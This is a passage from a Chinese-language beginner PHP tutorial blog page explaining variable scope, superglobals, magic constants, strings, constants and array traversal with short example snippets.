class="keyword">function</span> myTest()</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>]=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>]+<span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> myTest();</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$y</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong><br>不可在global 后写 $变量 &#x3D; 值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">global</span> <span class="variable">$a</span> , <span class="variable">$b</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果是不是显示出来了？</span></span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>1.通过$GLOBLAS来读取外部变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$one</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable">$two</span> = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$result</span> = <span class="variable">$two</span> + <span class="variable">$GLOBALS</span>[<span class="string">&#x27;one&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//你会发现结果变成了110</span></span><br><span class="line"><span class="keyword">echo</span> demo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上例中：我们将函数体外的变量通过$GLOBALS拿到了函数体使用。所以，打破了函数外的变量不能在函数体内使用的限定。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>static 作用域：</strong></font>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。要做到这一点，请在您第一次声明变量时使用 static 关键字：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="built_in">static</span> <span class="variable">$x</span>=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">     <span class="variable">$x</span>++;</span><br><span class="line"> &#125;</span><br><span class="line"> myTest();</span><br><span class="line"> myTest();</span><br><span class="line"> myTest();</span><br><span class="line"> myTest();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>2.通过$GLOBLAS，在函数内修改外部变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$hongniu</span> = <span class="string">&#x27;我是一个兵，来自老百姓&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;执行了函数test哟&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   //调用<span class="built_in">test</span>()函数，将通过<span class="variable">$GLOBALS</span>[<span class="string">&#x27;hongniu&#x27;</span>],把<span class="variable">$hongniu</span>的值改变掉</span><br><span class="line"></span><br><span class="line">   <span class="variable">$GLOBALS</span>[<span class="string">&#x27;hongniu&#x27;</span>] = <span class="string">&#x27;帮助别人很快乐&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">//发现是不是输出的值变了呀？</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$hongniu</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过上例：我们发现通过$GLOBALS[‘hongniu’],把$hongniu的值改变掉，所以在最后输出$hongniu的时候，值发生了变化。</p>
</blockquote>
<p>&amp;emsp;<br>3.通过$GLOBLAS，在函数内创建全局变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$GLOBALS</span>[<span class="string">&#x27;que&#x27;</span>] = <span class="string">&#x27;提神喝茶更好哟&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;你调了一下函数hello&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hello();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$que</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上例中，我们发现$que是不存在的，可以调用函数hello()后，在函数外部可以执行echo $que了，能够看到结果：提神喝茶更好。我们明白了，函数内声明的变量，通过$GLOBALS声明一个变量，也能够显示出来。</p>
</blockquote>
<p>&amp;emsp;<br>下面的知识是【了解】级别，我们越来越少的使用这种方式来声明全局变量了。在函数内使用global关键词后面跟一个或多个变量，就把变量变为了全局变量，格式如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">global</span> <span class="variable">$a</span> , <span class="variable">$b</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果是不是显示出来了？</span></span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. PHP 全局变量 - 超全局变量：</strong></font><br>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global<br>$变量名; 就可以访问它们。</p>
<p><font color="#00B2EE"><strong>PHP 超级全局变量列表：</strong></font> &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_superglobals.asp">PHP 全局变量 - 超全局变量</a>]</font><br><strong>$GLOBALS<br>$_SERVER<br>$_REQUEST<br>$_POST<br>$_GET<br>$_FILES<br>$_ENV<br>$_COOKIE<br>$_SESSION</strong><br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. PHP 系统变量（魔术常量）：</strong></font><br>PHP 向它运行的任何脚本提供了大量的预定义常量。<br>不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。<br><font color="#00B2EE"><strong>有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</strong></font><br></font> </p>
<p><a href="http://www.php.cn/code/159.html">使用方法参见</a></p>
<table>
<thead>
<tr>
<th align="center">常量符号</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">__LINE__</td>
<td>文件中的当前行号</td>
</tr>
<tr>
<td align="center">__FILE__</td>
<td>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP<br> 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路<br>径），而在此之前的版本有时会包含一个相对路径。</td>
</tr>
<tr>
<td align="center">__DIR__</td>
<td>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 <br>dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0<br>中新增）</td>
</tr>
<tr>
<td align="center">__FUNCTION__</td>
<td>函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小<br>写）。在 PHP 4 中该值总是小写字母的。</td>
</tr>
<tr>
<td align="center">__CLASS__</td>
<td>类的名称（PHP 4.3.0 新加）。自 PHP 5起本常量返回该类被定义时的名字（区分大小<br>写）</td>
</tr>
<tr>
<td align="center">__TRAIT__</td>
<td>Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP实现了代码复用的一个方法，<br>称为 traits。</td>
</tr>
<tr>
<td align="center">__METHOD__</td>
<td>类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-PHP-数据类型"><a href="#1-3-PHP-数据类型" class="headerlink" title="1.3 PHP 数据类型"></a><font color="#3CB371" face="Comic sans MS">1.3 PHP 数据类型</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP的数据类型包括以下几种：</strong></font><br><strong>Integer（整型）、String（字符串）、Float（浮点型）、Boolean（布尔型）、Array（数组）、Object（对象）、NULL（空值）</strong></p>
<p><font color="red"><strong>2. 查看变量数据类型：</strong></font><br><font color="#00B2EE"><strong>1. gettype(传入一个变量)</strong></font> 能够获得变量的类型<br><font color="#00B2EE"><strong>2. var_dump(传入一个变量)</strong></font>  输出变类型和值 （最常用）<br>var_dump()是一个函数。向括号()中间插入变量。这个函数，会打印出来数据类型，还会对应显示变量的长度和值。<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-PHP-字符串"><a href="#1-4-PHP-字符串" class="headerlink" title="1.4 PHP 字符串"></a><font color="#3CB371" face="Comic sans MS">1.4 PHP 字符串</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 字符串型可以用三种方法定义：</strong></font><strong>单引号形式</strong>、<strong>双引号形式</strong>和<strong>Heredoc结构</strong>形式。</p>
<p><font color="red"><strong>2.单、双引号嵌套使用时注意事项：</strong></font><br>1.若单引号嵌套单引号或者双引号嵌套双号时：里层(被嵌套)的引号要用“<font color="#FF7F00">&lt;&#x2F;font&gt;”转义字符转义；<br>2.单引号嵌套双引号或者双引号嵌套单引号时：不需要用转义字符。</p>
<p><font color="red"><strong>3.当美元符<font color="#FF7F00">$</font>在引号里时的区别：</strong></font><br>1.在双引号里：当双引号里包含变量时，变量会双引号里的内容连在一起；<br>2.在单引号里：变量会被当做字符地输出，即“<font color="#FF7F00"><strong>$</strong></font>”会被输出。<br></font></p>
<p><img data-src="https://i.loli.net/2019/02/13/5c6438a104ab9.png" alt="1"></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red">**4. Heredoc结构(&lt;&lt;&lt;)：**</font><br>2).然后在&lt;&lt;&lt;后面写上字符（建议英文大写字符）。如下例中的：ABC<br>3).然后换行写上任意想写的字符<br>4).写完后，顶行。在行最开始处，再写上&lt;&lt;&lt;后面的字符和分号。如下例中的：ABC;<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$dingjie</span> = &lt;&lt;&lt;<span class="string">ABC     //“=”和“&lt;&lt;&lt;”和“ABC</span>”这三个标志符号</span><br><span class="line">这里是字符串的内容。</span><br><span class="line">ABC;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. PHP strlen()  函数：</strong></font><br>有时知道字符串值的长度是很有用的。<br><font color="#00B2EE"><strong>strlen()</strong></font> 函数返回字符串的长度（字符数）。<br><strong>注意：</strong>在UTF-8下 strlen  把<font color="#00B2EE"><strong>中文字符算成 3 个字节，英文，空格，符号占 1 个字节。</strong></font><br>&amp;emsp;<br><font color="red"><strong>6. PHP strpos() 函数：</strong></font><br><font color="#00B2EE"><strong>strpos()</strong></font>函数用于在字符串内查找一个字符或一段指定的文本。<br>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。<br>实例:下面的实例在字符串 “Hello world!” 中查找文本 “world”：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="built_in">echo</span> strpos(<span class="string">&quot;Hello world!&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line"> ?&gt;</span><br><span class="line">运行结果：6</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p><font color="red"><strong>提示：</strong>在上面的实例中，字符串 “world” 的位置是 6。之所以是 6 而不是 7 的原因是，字符串中第一个字符的位置是 0，而不是 1。</font></p>
</blockquote>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-5-PHP-常量"><a href="#1-5-PHP-常量" class="headerlink" title="1.5 PHP 常量"></a><font color="#3CB371" face="Comic sans MS">1.5 PHP 常量</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 自定义常量：</strong></font><br>(1) 常量是单个值的标识符（名称）。在脚本中无法改变该值。<br>(2) 有效的常量名以字符或下划线开头（常量名称前面没有 $ 符号）。<br>(3) 常量名可以小写，但是通常大写。<br>(4) 常量是全局的，常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</p>
<p><font color="red">定义方法：</font><br>如需设置常量，请使用 define() 函数 - 它使用三个参数：</p>
<ol>
<li>首个参数定义常量的名称</li>
<li>第二个参数定义常量的值</li>
<li>可选的第三个参数规定常量名是否对大小写敏感。默认是 false。</li>
</ol>
<p><font color="red"><strong>注意关于define和const定义的区别：</strong></font><br>可以用 define() 函数来定义常量。在 PHP 5.3.0 以后，可以使用 <font color="#00B2EE"><strong>const</strong></font>  关键字在类定义的外部定义常量，先前版本const 关键字只能在类（class）中使用。一个常量一旦被定义，就不能再改变或者取消定义。<br>常量只能包含标量数据（boolean，integer，float 和 string）。 可以定义 resource 常量，但应尽量避免，因为会造成不可预料的结果。<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define定义方式：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;PII&quot;</span>;</span><br><span class="line">define(<span class="string">&quot;PI&quot;</span>,<span class="number">3.14</span>);define(<span class="variable">$p</span>,<span class="number">3.14</span>);</span><br><span class="line">define(<span class="variable">$p</span>,<span class="number">3.14</span>);</span><br><span class="line"><span class="keyword">echo</span> PI;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PII;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">3.14</span></span><br><span class="line"><span class="number">3.14</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">const定义方式：</span><br><span class="line">希望一个成员变量不被修改 例如圆周率 3.1415926</span><br><span class="line">定义：const 常量名=值; 没有$符</span><br><span class="line">访问：类名 ::常量名 或 接口名::常量名</span><br><span class="line"></span><br><span class="line">&lt;?php　　　　　　　　　　　　　　　　　　　　　　defined(<span class="string">&#x27;TEXT&#x27;</span>);检查一个名称的常量是否存在</span><br><span class="line"> class A&#123;</span><br><span class="line"> const TAX_RATE=0.08;</span><br><span class="line"> public <span class="keyword">function</span> payTax(<span class="variable">$var</span>)&#123;</span><br><span class="line"> <span class="built_in">return</span> <span class="variable">$var</span>*A::TAX_RATE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=new A();</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span>-&gt;payTax(200):</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>用法一：</strong></font>const用于类成员变量，一经定义不可修改，define用于全局常量，不可用于类成员变量的定义，const可在类中使用，define不能。<br><font color="#00B2EE"><strong>用法二：</strong></font>const定义的常量大小写敏感，而define可通过第三个参数(为TRUE表示大小写不敏感)来指定大小写是否敏感。在运行时定义一个常量。define(‘TXE’,100,TRUE);<br><font color="#00B2EE"><strong>用法三：</strong></font>const不能在条件语句中定义常量，而define函数可以。if($a&gt;10){define(‘LE’,’hello’);<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 判定常量是否被定义：</strong></font><br>如果常量被重复定义以后，PHP解析器会发出“Constant XXX already defined”的警告，提醒我们该常量已经被定义过。那么，在团队开发，或代码量很大的情况下，我们如何去判定一个常量是否被定义呢？<br><font color="#00B2EE"><strong>defined()</strong></font>函数可以帮助我们判断一个常量是否已经定义，其语法格式为：<br><font color="red">bool defined(string constants_name)</font><br>它只有参数constant_name，指的是要获取常量的名称，若存在则返回布尔类型true，否则返回布尔类型false; （注：bool表示函数返回值类型为布尔类型）<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">define(<span class="string">&quot;PI1&quot;</span>,3.14);</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;PI1&quot;</span>;</span><br><span class="line"><span class="variable">$is1</span> = defined(<span class="variable">$p</span>);</span><br><span class="line"><span class="variable">$is2</span> = defined(<span class="string">&quot;PI2&quot;</span>);</span><br><span class="line">var_dump(<span class="variable">$is1</span>);</span><br><span class="line">var_dump(<span class="variable">$is2</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. PHP 全局变量 - 超全局变量：</strong></font><br>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global<br>$变量名; 就可以访问它们。</p>
<p><font color="#00B2EE"><strong>PHP 超级全局变量列表：</strong></font> &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_superglobals.asp">PHP 全局变量 - 超全局变量</a>]</font><br><strong>$GLOBALS<br>$_SERVER<br>$_REQUEST<br>$_POST<br>$_GET<br>$_FILES<br>$_ENV<br>$_COOKIE<br>$_SESSION</strong><br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. PHP 系统变量（魔术常量）：</strong></font><br>PHP 向它运行的任何脚本提供了大量的预定义常量。<br>不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。<br><font color="#00B2EE"><strong>有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</strong></font><br></font> </p>
<p><a href="http://www.php.cn/code/159.html">使用方法参见</a></p>
<table>
<thead>
<tr>
<th align="center">常量符号</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">__LINE__</td>
<td>文件中的当前行号</td>
</tr>
<tr>
<td align="center">__FILE__</td>
<td>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP<br> 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路<br>径），而在此之前的版本有时会包含一个相对路径。</td>
</tr>
<tr>
<td align="center">__DIR__</td>
<td>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 <br>dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0<br>中新增）</td>
</tr>
<tr>
<td align="center">__FUNCTION__</td>
<td>函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小<br>写）。在 PHP 4 中该值总是小写字母的。</td>
</tr>
<tr>
<td align="center">__CLASS__</td>
<td>类的名称（PHP 4.3.0 新加）。自 PHP 5起本常量返回该类被定义时的名字（区分大小<br>写）</td>
</tr>
<tr>
<td align="center">__TRAIT__</td>
<td>Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP实现了代码复用的一个方法，<br>称为 traits。</td>
</tr>
<tr>
<td align="center">__METHOD__</td>
<td>类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-6-PHP数组：索引数组、关联数组"><a href="#1-6-PHP数组：索引数组、关联数组" class="headerlink" title="1.6 PHP数组：索引数组、关联数组"></a><font color="#3CB371" face="Comic sans MS">1.6 PHP数组：索引数组、关联数组</font></h4><p><font face="Comic sans MS">数组可以存入多个不同类型的数据，是一个复合数据类型。<br>我们可以使用<font color="red"><strong>array()</strong></font> 来初始化数组，每个数组元素之间使用逗号分隔  ,在PHP5.4版本之后，数组的初始化更为简洁，用中括号<font color="red"><strong>[ ]</strong></font> 来初始化。<br>数组的格式：$shuzu&#x3D;array(key&#x3D;&gt;value)<br>key：键值  &amp;emsp; value：键值对应值</p>
<p><font color="red"><strong>1. 索引数组：键值为整形（int）</strong></font><br><strong>我们来总结规律：</strong><br><font color="#00B2EE"><strong>1.</strong></font>索引数组若不强制声明他的下标，他的下标是从0开始的。（我们的第一个数组的值：只有不断努力才能博得未来。这个值的下标为0）。<br><font color="#00B2EE"><strong>2.</strong></font>如果我指定过下标他的下标就为我指定的值。如下标为5,10和下标为19的，都是我指定过的值。<br><font color="#00B2EE"><strong>3.</strong></font>若某个值（如php.cn），强制指定了下标（下标为10）。在它后面加上的值（PHP学院），不指定下标的话。他们的下标增长规律为最大值+1。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    //设置编码</span><br><span class="line"> <span class="variable">$array</span>=array(100,1.34,<span class="literal">true</span>,<span class="string">&quot;PHP中文网&quot;</span>,);</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> var_dump(<span class="variable">$array</span>);</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&#x27;&lt;pre/&gt;&#x27;</span>;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 关联数组：键值中只要有一个为字符串（String）类型即称为关联数组）</strong></font><br>那我们来声明一下关联数组。跟索引数组的声明方式完成一样。不过不同的是，必须要指定字符串的下标和必须要使用键值对应符。<br>我们通过实验知道：<br><font color="#00B2EE"><strong>1.</strong></font>声明关联数组是 键名 &#x3D;&gt; 值。<br><font color="#00B2EE"><strong>2.</strong></font>在关联数组可以有索引数组的元素。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$arr</span>=[            //用[ ]创建数组</span><br><span class="line">     <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;Tom&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;age&#x27;</span>=&gt;<span class="string">&#x27;18&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;gender&#x27;</span>=&gt;<span class="string">&#x27;male&#x27;</span></span><br><span class="line"> ];</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"> var_dump(<span class="variable">$arr</span>) ;</span><br><span class="line"> <span class="built_in">echo</span><span class="string">&quot;&lt;/pre&gt;&quot;</span></span><br><span class="line"> ?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：array(3) &#123;</span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  string(3) <span class="string">&quot;Tom&quot;</span></span><br><span class="line">  [<span class="string">&quot;age&quot;</span>]=&gt;</span><br><span class="line">  string(2) <span class="string">&quot;18&quot;</span></span><br><span class="line">  [<span class="string">&quot;gender&quot;</span>]=&gt;</span><br><span class="line">  string(4) <span class="string">&quot;male&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p><font color="red"><strong>注：</strong></font>上例中<font color="red"><strong>echo pre</strong></font>这个标签的主要目的是为原样输出，格式展示的更好看，更清晰。</p>
</blockquote>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 索引数组和关联数组遍历分别用for和foreach</strong></font><br><font color="#00B2EE"><strong>1. 索引数组：使用for遍历</strong></font><br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$arr</span>=Array(<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;andy&#x27;</span>,<span class="string">&#x27;jack&#x27;</span>);</span><br><span class="line"> <span class="variable">$arrlength</span>=count(<span class="variable">$arr</span>);</span><br><span class="line"> <span class="keyword">for</span>(<span class="variable">$x</span>=0;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++)&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="variable">$arr</span>[<span class="variable">$x</span>];</span><br><span class="line">     <span class="built_in">echo</span>  <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"> &#125; </span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><br><font color="#00B2EE"><strong>2. 关联数组：使用foreach遍历</strong></font><br>foreach的基本语法：<br>有一个布尔型循环是专门用来循环数组的。这个循环的基本语法就是foreach基本语法</p>
<p><font color="#FF7F00">foreach( 要循环的数组变量 as [键变量 &#x3D;&gt;] 值变量)<br>{<br>    &#x2F;&#x2F;循环的内容<br>}<br></font><br>这是一个固定用法，将要循环的数组放进去。<br>as 是一个固定的关键字；<br>后面的键变量是可选的，随意定义一个变量，每次循环的时候，foreach这个语法会把键取出来赋值到键变量里面；<br>后面的值变量是必填的。每次循环的时候，会把值放到值变量里面。<br>我们下面用代码来举例子，加强对这个语法的理解。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$arr</span>=[</span><br><span class="line">     <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;Tom&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;age&#x27;</span>=&gt;<span class="string">&#x27;18&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;gender&#x27;</span>=&gt;<span class="string">&#x27;male&#x27;</span></span><br><span class="line"> ];</span><br><span class="line"> foreach(<span class="variable">$arr</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="variable">$key</span>.<span class="string">&quot;: &quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"> &#125;;</span><br><span class="line">?&gt;</span><br><span class="line">运行结果：</span><br><span class="line">name: Tom</span><br><span class="line">age: 18</span><br><span class="line">gender: male</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>通过上面的运行结果我们得出下面的结果：</strong></font><br>1.每次循环的时候，把下标赋值给了变量$key，把值的变量赋值给了变量$value<br>2.循环一次读一次键和值。读到最后，发现没有可以读取的数组元素后，停止循环遍历数据。<br><strong>注意：</strong>$key 和$value并不是变量名必须得为这两个名字。你命名为其他的也可以，如 $kai &#x3D;&gt; $wen是一样的。 你要清楚键赋值给了哪个变量，值赋值给了另外的哪个变量。</p>
<p><font color="#00B2EE"><strong>3. 通过foreach遍历不连续的索引数组，如下例：</strong></font><br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    //设置编码</span><br><span class="line"> <span class="variable">$data</span> = array(</span><br><span class="line">     0 =&gt; <span class="string">&#x27;中国&#x27;</span>,</span><br><span class="line">     100 =&gt; <span class="string">&#x27;美国&#x27;</span>,</span><br><span class="line">     20 =&gt; <span class="string">&#x27;韩国&#x27;</span>,</span><br><span class="line">     300 =&gt; <span class="string">&#x27;德国&#x27;</span>,</span><br><span class="line"> ); </span><br><span class="line"> foreach(<span class="variable">$data</span> as <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="variable">$k</span> . <span class="string">&#x27;------&#x27;</span> . <span class="variable">$v</span> .<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line">运行结果：</span><br><span class="line">0------中国</span><br><span class="line">100------美国</span><br><span class="line">20------韩国</span><br><span class="line">300------德国</span><br></pre></td></tr></table></figure>

